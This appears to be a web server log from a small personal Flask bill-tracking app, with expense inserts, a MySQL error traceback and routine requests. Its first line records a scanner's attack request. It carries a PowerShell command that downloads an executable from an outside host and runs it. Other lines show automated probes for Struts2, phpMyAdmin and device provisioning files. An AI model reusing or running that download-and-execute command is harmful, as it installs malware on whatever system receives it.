+[pid: 13054|app: 0|req: 34/34] 127.0.0.1 () {34 vars in 1128 bytes} [Wed Jan  8 12:16:01 2020] GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fk.openyourass.icu/download.exe','%SystemRoot%/Temp/zzsqngpfmwkmvka11893.exe');start%20%SystemRoot%/Temp/zzsqngpfmwkmvka11893.exe => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 35/35] 127.0.0.1 () {36 vars in 1537 bytes} [Wed Jan  8 12:16:17 2020] GET /struts2-rest-showcase/orders.xhtml => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 36/36] 127.0.0.1 () {36 vars in 1471 bytes} [Wed Jan  8 12:16:17 2020] GET /index.action => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 37/37] 127.0.0.1 () {36 vars in 1459 bytes} [Wed Jan  8 12:16:17 2020] GET /index.do => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 38/38] 127.0.0.1 () {34 vars in 495 bytes} [Wed Jan  8 17:51:34 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 39/39] 127.0.0.1 () {34 vars in 579 bytes} [Wed Jan  8 18:41:52 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 40/40] 127.0.0.1 () {34 vars in 513 bytes} [Wed Jan  8 18:41:53 2020] GET /apple-touch-icon-120x120-precomposed.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 41/41] 127.0.0.1 () {34 vars in 489 bytes} [Wed Jan  8 18:41:53 2020] GET /apple-touch-icon-120x120.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 42/42] 127.0.0.1 () {34 vars in 473 bytes} [Wed Jan  8 18:41:53 2020] GET /apple-touch-icon.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 43/43] 127.0.0.1 () {34 vars in 473 bytes} [Wed Jan  8 18:41:53 2020] GET /apple-touch-icon.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+INSERT INTO bill (date, detail, bankcard) VALUES ( '2020-01-08','晚饭',-15) ;
+[pid: 13054|app: 0|req: 44/44] 127.0.0.1 () {42 vars in 761 bytes} [Wed Jan  8 18:42:19 2020] POST /insertresult => generated 304 bytes in 22 msecs (HTTP/1.0 200) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 45/45] 127.0.0.1 () {34 vars in 496 bytes} [Wed Jan  8 18:58:14 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 46/46] 127.0.0.1 () {34 vars in 579 bytes} [Wed Jan  8 19:53:32 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 47/47] 127.0.0.1 () {34 vars in 513 bytes} [Wed Jan  8 19:53:33 2020] GET /apple-touch-icon-120x120-precomposed.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 48/48] 127.0.0.1 () {34 vars in 489 bytes} [Wed Jan  8 19:53:33 2020] GET /apple-touch-icon-120x120.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 49/49] 127.0.0.1 () {34 vars in 473 bytes} [Wed Jan  8 19:53:33 2020] GET /apple-touch-icon.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 50/50] 127.0.0.1 () {34 vars in 473 bytes} [Wed Jan  8 19:53:33 2020] GET /apple-touch-icon.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+INSERT INTO bill (date, detail, huabei) VALUES ( '2020-01-08','肯德基',-55) ;
+[pid: 13054|app: 0|req: 51/51] 127.0.0.1 () {42 vars in 761 bytes} [Wed Jan  8 19:53:49 2020] POST /insertresult => generated 304 bytes in 23 msecs (HTTP/1.0 200) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 52/52] 127.0.0.1 () {34 vars in 578 bytes} [Wed Jan  8 20:44:32 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 53/53] 127.0.0.1 () {34 vars in 513 bytes} [Wed Jan  8 20:44:32 2020] GET /apple-touch-icon-120x120-precomposed.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 54/54] 127.0.0.1 () {34 vars in 489 bytes} [Wed Jan  8 20:44:32 2020] GET /apple-touch-icon-120x120.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 55/55] 127.0.0.1 () {34 vars in 473 bytes} [Wed Jan  8 20:44:32 2020] GET /apple-touch-icon.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 56/56] 127.0.0.1 () {34 vars in 473 bytes} [Wed Jan  8 20:44:32 2020] GET /apple-touch-icon.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+INSERT INTO bill (date, detail, cmbcredit) VALUES ( '2020-01-08','部落与弯刀',-37) ;
+[pid: 13054|app: 0|req: 57/57] 127.0.0.1 () {42 vars in 761 bytes} [Wed Jan  8 20:44:49 2020] POST /insertresult => generated 304 bytes in 30 msecs (HTTP/1.0 200) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 58/58] 127.0.0.1 () {30 vars in 397 bytes} [Wed Jan  8 22:07:22 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 59/59] 127.0.0.1 () {34 vars in 492 bytes} [Wed Jan  8 22:25:13 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 60/60] 127.0.0.1 () {26 vars in 275 bytes} [Wed Jan  8 22:45:57 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 61/61] 127.0.0.1 () {34 vars in 558 bytes} [Wed Jan  8 22:45:57 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 62/62] 127.0.0.1 () {34 vars in 558 bytes} [Wed Jan  8 22:46:21 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 63/63] 127.0.0.1 () {28 vars in 397 bytes} [Wed Jan  8 23:27:11 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 64/64] 127.0.0.1 () {30 vars in 398 bytes} [Wed Jan  8 23:48:00 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 65/65] 127.0.0.1 () {26 vars in 275 bytes} [Thu Jan  9 00:42:40 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 66/66] 127.0.0.1 () {28 vars in 310 bytes} [Thu Jan  9 01:08:41 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 67/67] 127.0.0.1 () {32 vars in 463 bytes} [Thu Jan  9 01:51:08 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 68/68] 127.0.0.1 () {28 vars in 313 bytes} [Thu Jan  9 01:51:09 2020] HEAD / => generated 0 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (0 switches on core 0)
+[pid: 13054|app: 0|req: 69/69] 127.0.0.1 () {32 vars in 455 bytes} [Thu Jan  9 02:00:18 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 70/70] 127.0.0.1 () {32 vars in 455 bytes} [Thu Jan  9 02:01:14 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 71/71] 127.0.0.1 () {34 vars in 401 bytes} [Thu Jan  9 02:10:29 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 72/72] 127.0.0.1 () {32 vars in 361 bytes} [Thu Jan  9 02:17:14 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 73/73] 127.0.0.1 () {32 vars in 361 bytes} [Thu Jan  9 02:27:31 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 74/74] 127.0.0.1 () {30 vars in 398 bytes} [Thu Jan  9 03:45:10 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 75/75] 127.0.0.1 () {36 vars in 609 bytes} [Thu Jan  9 04:06:09 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 76/76] 127.0.0.1 () {38 vars in 673 bytes} [Thu Jan  9 04:06:12 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 77/77] 127.0.0.1 () {30 vars in 378 bytes} [Thu Jan  9 04:10:04 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 78/78] 127.0.0.1 () {34 vars in 492 bytes} [Thu Jan  9 05:11:07 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 79/79] 127.0.0.1 () {26 vars in 275 bytes} [Thu Jan  9 06:54:54 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 80/80] 127.0.0.1 () {44 vars in 777 bytes} [Thu Jan  9 08:27:59 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 81/81] 127.0.0.1 () {40 vars in 681 bytes} [Thu Jan  9 08:28:04 2020] GET /favicon.ico => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+INSERT INTO bill (date, detail, bankcard) VALUES ( '2020-01-09','借呗',1000) ;
+[pid: 13054|app: 0|req: 82/82] 127.0.0.1 () {52 vars in 973 bytes} [Thu Jan  9 08:28:10 2020] POST /insertresult => generated 304 bytes in 48 msecs (HTTP/1.0 200) 2 headers in 80 bytes (1 switches on core 0)
+INSERT INTO bill (date, detail, jiebei) VALUES ( '2020-01-09','借呗',-1000) ;
+[pid: 13054|app: 0|req: 83/83] 127.0.0.1 () {52 vars in 973 bytes} [Thu Jan  9 08:28:18 2020] POST /insertresult => generated 304 bytes in 21 msecs (HTTP/1.0 200) 2 headers in 80 bytes (1 switches on core 0)
+INSERT INTO bill (date, detail, bankcard) VALUES ( '2020-01-09','还金条',-385.3) ;
+[pid: 13054|app: 0|req: 84/84] 127.0.0.1 () {52 vars in 973 bytes} [Thu Jan  9 08:30:13 2020] POST /insertresult => generated 304 bytes in 22 msecs (HTTP/1.0 200) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 85/85] 127.0.0.1 () {26 vars in 275 bytes} [Thu Jan  9 10:19:27 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 86/86] 127.0.0.1 () {32 vars in 477 bytes} [Thu Jan  9 10:27:41 2020] GET /provisioning/y000000000000.cfg => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 87/87] 127.0.0.1 () {32 vars in 477 bytes} [Thu Jan  9 10:27:44 2020] GET /provisioning/y000000000005.cfg => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 88/88] 127.0.0.1 () {32 vars in 477 bytes} [Thu Jan  9 10:27:48 2020] GET /provisioning/y000000000007.cfg => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 89/89] 127.0.0.1 () {32 vars in 477 bytes} [Thu Jan  9 10:27:53 2020] GET /provisioning/y000000000025.cfg => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 90/90] 127.0.0.1 () {32 vars in 477 bytes} [Thu Jan  9 10:27:57 2020] GET /provisioning/y000000000028.cfg => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 91/91] 127.0.0.1 () {32 vars in 477 bytes} [Thu Jan  9 10:28:00 2020] GET /provisioning/y000000000029.cfg => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 92/92] 127.0.0.1 () {32 vars in 477 bytes} [Thu Jan  9 10:28:06 2020] GET /provisioning/y000000000035.cfg => generated 232 bytes in 1 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 93/93] 127.0.0.1 () {32 vars in 477 bytes} [Thu Jan  9 10:28:12 2020] GET /provisioning/y000000000045.cfg => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 94/94] 127.0.0.1 () {32 vars in 477 bytes} [Thu Jan  9 10:28:24 2020] GET /provisioning/y000000000046.cfg => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 95/95] 127.0.0.1 () {32 vars in 477 bytes} [Thu Jan  9 10:28:29 2020] GET /provisioning/y000000000052.cfg => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 96/96] 127.0.0.1 () {32 vars in 477 bytes} [Thu Jan  9 10:28:32 2020] GET /provisioning/y000000000065.cfg => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 97/97] 127.0.0.1 () {32 vars in 477 bytes} [Thu Jan  9 10:28:40 2020] GET /provisioning/y000000000066.cfg => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 98/98] 127.0.0.1 () {32 vars in 477 bytes} [Thu Jan  9 10:28:46 2020] GET /provisioning/y000000000067.cfg => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 99/99] 127.0.0.1 () {32 vars in 477 bytes} [Thu Jan  9 10:28:51 2020] GET /provisioning/y000000000068.cfg => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 100/100] 127.0.0.1 () {26 vars in 275 bytes} [Thu Jan  9 10:35:08 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 101/101] 127.0.0.1 () {32 vars in 455 bytes} [Thu Jan  9 10:57:06 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 102/102] 127.0.0.1 () {34 vars in 579 bytes} [Thu Jan  9 11:33:11 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 103/103] 127.0.0.1 () {34 vars in 513 bytes} [Thu Jan  9 11:33:12 2020] GET /apple-touch-icon-120x120-precomposed.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 104/104] 127.0.0.1 () {34 vars in 489 bytes} [Thu Jan  9 11:33:12 2020] GET /apple-touch-icon-120x120.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 105/105] 127.0.0.1 () {34 vars in 473 bytes} [Thu Jan  9 11:33:12 2020] GET /apple-touch-icon.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 106/106] 127.0.0.1 () {34 vars in 473 bytes} [Thu Jan  9 11:33:12 2020] GET /apple-touch-icon.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+INSERT INTO bill (date, detail, huabei) VALUES ( '2020-01-09','午饭',-19.1) ;
+[pid: 13054|app: 0|req: 107/107] 127.0.0.1 () {42 vars in 761 bytes} [Thu Jan  9 11:33:25 2020] POST /insertresult => generated 304 bytes in 29 msecs (HTTP/1.0 200) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 108/108] 127.0.0.1 () {32 vars in 556 bytes} [Thu Jan  9 12:15:42 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 109/109] 127.0.0.1 () {26 vars in 274 bytes} [Thu Jan  9 12:19:51 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 110/110] 127.0.0.1 () {34 vars in 578 bytes} [Thu Jan  9 16:00:30 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 111/111] 127.0.0.1 () {34 vars in 512 bytes} [Thu Jan  9 16:00:31 2020] GET /apple-touch-icon-120x120-precomposed.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 112/112] 127.0.0.1 () {34 vars in 488 bytes} [Thu Jan  9 16:00:31 2020] GET /apple-touch-icon-120x120.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 113/113] 127.0.0.1 () {34 vars in 472 bytes} [Thu Jan  9 16:00:31 2020] GET /apple-touch-icon.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 114/114] 127.0.0.1 () {34 vars in 472 bytes} [Thu Jan  9 16:00:31 2020] GET /apple-touch-icon.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+INSERT INTO bill (date, detail, jiebei) VALUES ( '2020-01-09','借呗',_2441) ;
+[2020-01-09 16:01:37,021] ERROR in app: Exception on /insertresult [POST]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.6/site-packages/flask/app.py", line 2446, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.6/site-packages/flask/app.py", line 1951, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.6/site-packages/flask/app.py", line 1820, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/local/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/usr/local/lib/python3.6/site-packages/flask/app.py", line 1949, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.6/site-packages/flask/app.py", line 1935, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/python/flask/bill/app.py", line 17, in insertresult
+    insert_bill(noun4,noun5,noun1)
+  File "/home/python/flask/bill/operate_data.py", line 50, in insert_bill
+    cursor.execute(sql)
+  File "/usr/local/lib/python3.6/site-packages/mysql/connector/cursor.py", line 551, in execute
+    self._handle_result(self._connection.cmd_query(stmt))
+  File "/usr/local/lib/python3.6/site-packages/mysql/connector/connection.py", line 490, in cmd_query
+    result = self._handle_result(self._send_cmd(ServerCmd.QUERY, query))
+  File "/usr/local/lib/python3.6/site-packages/mysql/connector/connection.py", line 395, in _handle_result
+    raise errors.get_exception(packet)
+mysql.connector.errors.ProgrammingError: 1054 (42S22): Unknown column '_2441' in 'field list'
+[pid: 13054|app: 0|req: 115/115] 127.0.0.1 () {42 vars in 760 bytes} [Thu Jan  9 16:01:37 2020] POST /insertresult => generated 290 bytes in 21 msecs (HTTP/1.0 500) 2 headers in 84 bytes (1 switches on core 0)
+INSERT INTO bill (date, detail, jiebei) VALUES ( '2020-01-09','借呗',-2441) ;
+[pid: 13054|app: 0|req: 116/116] 127.0.0.1 () {42 vars in 760 bytes} [Thu Jan  9 16:01:43 2020] POST /insertresult => generated 304 bytes in 22 msecs (HTTP/1.0 200) 2 headers in 80 bytes (1 switches on core 0)
+INSERT INTO bill (date, detail, bankcard) VALUES ( '2020-01-09','张树申',-560) ;
+[pid: 13054|app: 0|req: 117/117] 127.0.0.1 () {42 vars in 761 bytes} [Thu Jan  9 16:02:12 2020] POST /insertresult => generated 304 bytes in 22 msecs (HTTP/1.0 200) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 118/118] 127.0.0.1 () {32 vars in 435 bytes} [Thu Jan  9 17:28:29 2020] GET /robots.txt => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 119/119] 127.0.0.1 () {32 vars in 419 bytes} [Thu Jan  9 17:28:32 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 120/120] 127.0.0.1 () {34 vars in 584 bytes} [Thu Jan  9 17:44:28 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 121/121] 127.0.0.1 () {34 vars in 630 bytes} [Thu Jan  9 17:44:28 2020] GET /explicit_not_exist_path => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 122/122] 127.0.0.1 () {34 vars in 604 bytes} [Thu Jan  9 17:44:28 2020] GET /index.html => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 123/123] 127.0.0.1 () {34 vars in 602 bytes} [Thu Jan  9 17:44:28 2020] GET /index.php => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 124/124] 127.0.0.1 () {34 vars in 602 bytes} [Thu Jan  9 17:44:28 2020] GET /index.jsp => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 125/125] 127.0.0.1 () {34 vars in 596 bytes} [Thu Jan  9 17:44:28 2020] GET /admin/ => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 126/126] 127.0.0.1 () {34 vars in 606 bytes} [Thu Jan  9 17:44:28 2020] GET /favicon.ico => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 127/127] 127.0.0.1 () {34 vars in 604 bytes} [Thu Jan  9 17:44:28 2020] GET /robots.txt => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 128/128] 127.0.0.1 () {34 vars in 592 bytes} [Thu Jan  9 17:44:28 2020] GET /wcm/ => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 129/129] 127.0.0.1 () {34 vars in 606 bytes} [Thu Jan  9 17:44:28 2020] GET /phpMyAdmin/ => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 130/130] 127.0.0.1 () {34 vars in 606 bytes} [Thu Jan  9 17:44:28 2020] GET /phpmyadmin/ => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 131/131] 127.0.0.1 () {34 vars in 496 bytes} [Thu Jan  9 17:52:11 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 132/132] 127.0.0.1 () {34 vars in 583 bytes} [Thu Jan  9 18:07:03 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 133/133] 127.0.0.1 () {34 vars in 629 bytes} [Thu Jan  9 18:07:03 2020] GET /explicit_not_exist_path => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 134/134] 127.0.0.1 () {34 vars in 603 bytes} [Thu Jan  9 18:07:03 2020] GET /index.html => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 135/135] 127.0.0.1 () {34 vars in 601 bytes} [Thu Jan  9 18:07:03 2020] GET /index.php => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 136/136] 127.0.0.1 () {34 vars in 601 bytes} [Thu Jan  9 18:07:03 2020] GET /index.jsp => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 137/137] 127.0.0.1 () {34 vars in 595 bytes} [Thu Jan  9 18:07:03 2020] GET /admin/ => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 138/138] 127.0.0.1 () {34 vars in 605 bytes} [Thu Jan  9 18:07:03 2020] GET /favicon.ico => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 139/139] 127.0.0.1 () {34 vars in 604 bytes} [Thu Jan  9 18:07:03 2020] GET /robots.txt => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 140/140] 127.0.0.1 () {34 vars in 592 bytes} [Thu Jan  9 18:07:03 2020] GET /wcm/ => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 141/141] 127.0.0.1 () {34 vars in 606 bytes} [Thu Jan  9 18:07:03 2020] GET /phpMyAdmin/ => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 142/142] 127.0.0.1 () {34 vars in 606 bytes} [Thu Jan  9 18:07:03 2020] GET /phpmyadmin/ => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 143/143] 127.0.0.1 () {34 vars in 584 bytes} [Thu Jan  9 18:08:15 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
